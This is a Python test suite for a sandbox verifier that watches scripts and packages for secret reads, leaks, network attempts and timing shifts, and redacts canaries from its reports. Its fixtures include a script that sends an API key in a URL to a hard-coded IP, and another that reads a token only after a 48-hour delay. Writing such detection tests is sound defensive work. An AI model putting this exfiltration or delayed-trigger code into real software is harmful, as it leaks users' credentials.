import json
import base64
from pathlib import Path
import subprocess
import sys
import tempfile
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from differ import compare_with_lockfile, policy_config
from lockfile import build_lock_data, load_lockfile, save_lockfile
from runner import MAX_EVENTS, _read_trace, run_in_sandbox, run_multi_horizon
from package_runner import run_package_horizons
from schema import load_report, validate_lock
sys.path.insert (0, str(Path(__file__).resolve().parent))
from test_6 import wheel

ROOT = Path(__file__).resolve().parents[1]


def script(folder, name, code):
    path = Path(folder, name)
    path.write_text(code, encoding="utf-8")
    return path


def baseline(folder, hours=(0,)):
    clean = script(folder, 'clean.py', "print('ok')\n")
    return build_lock_data(run_multi_horizon(clean, hours))


def test_source_and_unknown():
    with tempfile.TemporaryDirectory() as folder:
        path = script(folder, 'target.py', "import os\nopen('note', 'w').write('x')\nos.environ['OPENAI_API_KEY']\n")
        run = run_in_sandbox(path)
        assert run['complete']
        file_event = next(e for e in run['events'] if e['category'] == 'file' and e['target'] == '<PROJECT>/note')
        env_event = next(e for e in run['events'] if e['category'] == 'env' and e['target'] == 'OPENAI_API_KEY')
        assert file_event['source']['path'] == '<PROJECT>/target.py' and file_event['source']['line'] == 2
        assert env_event['source']['line'] == 3
        assert any(e['source']['status'] == 'unknown' for e in run['events'])


def test_typed_evidence_and_redaction():
    with tempfile.TemporaryDirectory() as folder:
        base = baseline(folder)
        path = script(folder, 'candidate.py', '''import os, subprocess, urllib.request
key = os.environ['OPENAI_API_KEY']
print(key)
open('note', 'w').write(key)
subprocess.run(['/bin/true', key])
try:
    urllib.request.urlopen('http://93.184.216.34/?key=' + key)
except Exception:
    pass
''')
        run = run_multi_horizon(path, [0])
        report_path = Path(folder, 'report.json')
        report = compare_with_lockfile(base, run, report_out_path=report_path)
        evidence = report['canary_evidence']['0']
        assert {'environment_read', 'stdout', 'written_file', 'process_argument', 'network_attempt'} <= {e['channel'] for e in evidence}
        assert any(e['status'] == 'blocked' for e in evidence if e['channel'] == 'network_attempt')
        assert report['transmission_status'] == 'unknown' and report['verdict'] == 'BLOCKED'
        saved = report_path.read_text()
        assert '?key=' not in saved and 'waketrace-' not in saved
        assert load_report(report_path) == report
        known = "7_SECRET_123"
        compare_with_lockfile(base, run_in_sandbox(path, custom_canaries={'OPENAI_API_KEY': known}),
                              report_out_path=report_path)
        saved = report_path.read_text()
        assert known not in saved and base64.b64encode(known.encode()).decode() not in saved
        assert known.encode().hex() not in saved
        ids = {e['id'] for e in report['events']['0']}
        assert all(ref['event_id'] in ids for f in report['findings'] for ref in f['evidence_ids'])


def test_stdout_only_is_exposure():
    with tempfile.TemporaryDirectory() as folder:
        base = baseline(folder)
        path = script(folder, 'candidate.py', "import os\nprint(os.environ['OPENAI_API_KEY'])\n")
        report = compare_with_lockfile(base, run_multi_horizon(path, [0]))
        assert report['verdict'] == 'WARNING'
        assert any(f.get('channel') == 'stdout' and 'output exposure' in f['reason'] for f in report['findings'])
        assert not any(f.get('channel') == 'network_attempt' for f in report['findings'])


def test_benign_ssl_probes():
    with tempfile.TemporaryDirectory() as folder:
        base = baseline(folder)
        path = script(folder, 'ssl_probe.py', 'import ssl\nssl.create_default_context()\n')
        report = compare_with_lockfile(base, run_multi_horizon(path, [0]))
        assert 'SSLKEYLOGFILE' in report['candidate_capabilities']['env_vars_read']
        assert 'SSLKEYLOGFILE' in report['ignored_incidental_env']
        assert not any(f['item'] == 'SSLKEYLOGFILE' for f in report['findings'])


def test_timing_and_coverage():
    with tempfile.TemporaryDirectory() as folder:
        clean = script(folder, 'clean.py', "import os, time\nif time.time() > 0:\n    pass\nif int(os.environ.get('WAKETRACE_UNUSED', '0')):\n    pass\n")
        base = build_lock_data(run_multi_horizon(clean, [0, 72]))
        base['capabilities']['env_vars_read'].append('SPECIAL_TOKEN')
        base['capabilities_by_horizon']['72']['env_vars_read'].append('SPECIAL_TOKEN')
        validate_lock(base)
        candidate = script(folder, 'candidate.py', "import os\nos.getenv('SPECIAL_TOKEN')\n")
        report = compare_with_lockfile(base, run_multi_horizon(candidate, [0]))
        assert any(f['change'] == 'timing_shift' and f['baseline_first_seen_hour'] == 72 for f in report['findings'])
        early = dict(base)
        early['capabilities_by_horizon'] = {key: {name: list(values) for name, values in caps.items()}
                                           for key, caps in base['capabilities_by_horizon'].items()}
        early['capabilities_by_horizon']['0']['env_vars_read'].append('SPECIAL_TOKEN')
        delayed = script(folder, 'delayed.py', '''import os, time
if time.time() - os.path.getmtime(__file__) >= 48 * 3600:
    os.getenv('SPECIAL_TOKEN')
''')
        later = compare_with_lockfile(early, run_multi_horizon(delayed, [0, 72]))
        assert any(f['change'] == 'timing_shift' and f['first_seen_hour'] == 72
                   for f in later['findings'])
        old = dict(base)
        old['schema_version'] = '1.0'
        old.pop('capabilities_by_horizon')
        old.pop('temporal_coverage')
        report = compare_with_lockfile(old, run_multi_horizon(candidate, [0]))
        assert not any(f['change'] == 'timing_shift' for f in report['findings'])
        assert report['temporal_coverage_missing'] == [0]


def test_incomplete_and_cli_exit():
    with tempfile.TemporaryDirectory() as folder:
        lock = baseline(folder)
        lock_path = Path(folder, 'lock.json')
        save_lockfile(lock, lock_path)
        crash = script(folder, 'crash.py', "raise RuntimeError('broken')\n")
        report_path = Path(folder, 'report.json')
        result = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'verify', str(crash),
                                 '-b', str(lock_path), '-r', str(report_path), '--horizons', '0'],
                                 capture_output=True, text=True, timeout=30)
        assert result.returncode == 2 and load_report(report_path)['verdict'] == 'INCOMPLETE'
        slow = script(folder, 'slow.py', 'import time\ntime.sleep(0.01)\nwhile True: pass\n')
        result = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'verify', str(slow),
                                  '-b', str(lock_path), '-r', str(report_path), '--horizons', '0',
                                  '--timeout', '0.2'], capture_output=True, text=True, timeout=30)
        assert result.returncode == 2 and load_report(report_path)['run_health']['0']['reason'] == 'timeout'
        malformed = script(folder, 'malformed.py',
                           "with open('/trace/events.jsonl', 'a') as fp:\n   fp.write('{bad json\\n')\n")
        result = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'verify', str(malformed),
                                 '-b', str(lock_path), '-r', str(report_path), '--horizons', '0'],
                                 capture_output=True, text=True, timeout=30)
        assert result.returncode == 2
        assert load_report(report_path)['run_health']['0']['reason'] == 'trace parse failure'
        for reason in ('hook start/end missing', 'trace parse failure', 'event limit exceeded'):
            with patch('runner._read_trace', return_value=([], False, reason)):
                report = compare_with_lockfile(lock, run_multi_horizon(crash, [0]),
                                               report_out_path=report_path)
            assert report['verdict'] == 'INCOMPLETE'
            assert load_report(report_path)['run_health']['0']['reason'] == reason


def test_trace_cap_and_schema():
    with tempfile.TemporaryDirectory() as folder:
        path = Path(folder, 'trace.jsonl')
        with path.open('w') as fp:
            for i in range(MAX_EVENTS + 1):
                fp.write(json.dumps({'id': i + 1, 'category': 'env', 'action': 'env_read', 'target': 'X'}) + '\n')
        assert _read_trace(path)[1] is False
        path.write_text(''.join(json.dumps({'id': i + 1, 'category': 'health',
                                            'action': action, 'target': 'hook'}) + '\n'
                                for i, action in enumerate(('hook_ready',
                                                            'canary_scan_incomplete', 'hook_done'))))
        assert _read_trace(path)[2] == 'canary file scan exceeded limit'
        lock = baseline(folder)
        path = Path(folder, 'lock.json')
        save_lockfile(lock, path)
        assert load_lockfile(path) == lock
        for version in ('1.0', '1.1'):
            legacy = dict(lock)
            legacy['schema_version'] = version
            legacy.pop('capabilities_by_horizon')
            legacy.pop('temporal_coverage')
            path.write_text(json.dumps(legacy))
            assert load_lockfile(path)['schema_version'] == version
        lock['schema_version'] = '9.0'
        path.write_text(json.dumps(lock))
        try:
            load_lockfile(path)
        except ValueError:
            pass
        else:
            raise AssertionError('unknown schema accepted')


def test_package_setup_failure_report():
    with tempfile.TemporaryDirectory() as folder:
        good = wheel(folder, 'phase7-pkg', '1.0', 'phase7_mod',
                     "import os\nos.getenv('SPECIAL_SETTING')\nprint('ready')\n")
        bad = wheel(folder, 'phase7-pkg', '2.0', 'phase7_mod', "print('ready')\n",
                    tag='cp310-cp310-manylinux_2_17_x86_64')
        lock_path = Path(folder, 'package.lock.json')
        report_path = Path(folder, 'package.report.json')
        locked = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'lock', str(good),
                                '-o', str(lock_path), '--exercise', 'import', '--module',
                                'phase7_mod', '--horizons', '0'], capture_output=True,
                                text=True, timeout=90)
        assert locked.returncode == 0, locked.stderr
        legacy = json.loads(lock_path.read_text())
        legacy['schema_version'] = '1.1'
        legacy.pop('capabilities_by_horizon')
        legacy.pop('temporal_coverage')
        old_path = Path(folder, 'legacy.lock.json')
        old_path.write_text(json.dumps(legacy))
        old_lock = load_lockfile(old_path)
        assert old_lock['schema_version'] == '1.1'
        old_check = run_package_horizons(good, old_lock['exercise'], [0])
        event = next(e for e in old_check['runs']['0']['events'] if e['category'] == 'env'
                     and e['target'] == 'SPECIAL_SETTING')
        assert event['source']['path'] == '<PACKAGE>/phase7_mod.py'
        assert event['source']['line'] == 2
        old_comparison = compare_with_lockfile(old_lock, old_check)
        assert old_comparison['temporal_coverage_missing'] == [0]
        result = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'verify', str(bad),
                                 '-b', str(lock_path), '-r', str(report_path),
                                 '--horizons', '0'], capture_output=True, text=True, timeout=90)
        report = load_report(report_path)
        assert result.returncode == 2 and report['verdict'] == 'INCOMPLETE'
        assert report['run_health']['0']['stage'] == 'setup'
        old_report = Path(folder, 'old-report.json')
        old_report.write_text(json.dumps({'verdict': 'BLOCKED',
                                          'secret_url': 'http://host/?key=raw-secret'}))
        assert load_report(old_report)['verdict'] == 'INCOMPLETE'
        assert 'raw-secret' not in json.dumps(load_report(old_report))


def test_policy():
    assert policy_config({'weights': {'canary_stdout': 0}})['weights']['canary_stdout'] == 0
    with tempfile.TemporaryDirectory() as folder:
        base = baseline(folder)
        candidate = script(folder, 'candidate.py', "import os\nprint(os.environ['OPENAI_API_KEY'])\n")
        runs = run_multi_horizon(candidate, [0])
        regular = compare_with_lockfile(base, runs)
        custom = compare_with_lockfile(base, runs, policy={'weights': {'canary_stdout': 0}})
        assert regular['risk_score'] - custom['risk_score'] == 10
        assert regular['verdict'] == custom['verdict'] == 'WARNING'
        lock_path = Path(folder, 'lock.json')
        save_lockfile(base, lock_path)
        policy_path = Path(folder, 'bad-policy.json')
        policy_path.write_text('{"unexpected": 1}')
        invalid = subprocess.run([sys.executable, str(ROOT / 'main.py'), 'verify', str(candidate),
                                  '-b', str(lock_path), '--policy', str(policy_path)],
                                  capture_output=True, text=True, timeout=30)
        assert invalid.returncode == 2 and 'unknown policy keys' in invalid.stderr
    for data in ({'mystery': 1}, {'weights': {'x': 2}}, {'block_threshold': float('nan')}):
        try:
            policy_config(data)
        except ValueError:
            pass
        else:
            raise AssertionError('invalid policy accepted')


if __name__ == '__main__':
    failed = 0
    for name in sorted(n for n in globals() if n.startswith('test_')):
        try:
            globals()[name]()
            print('PASS:', name)
        except Exception as exc:
            failed += 1
            print('FAIL:', name, repr(exc))
    raise SystemExit(bool(failed))
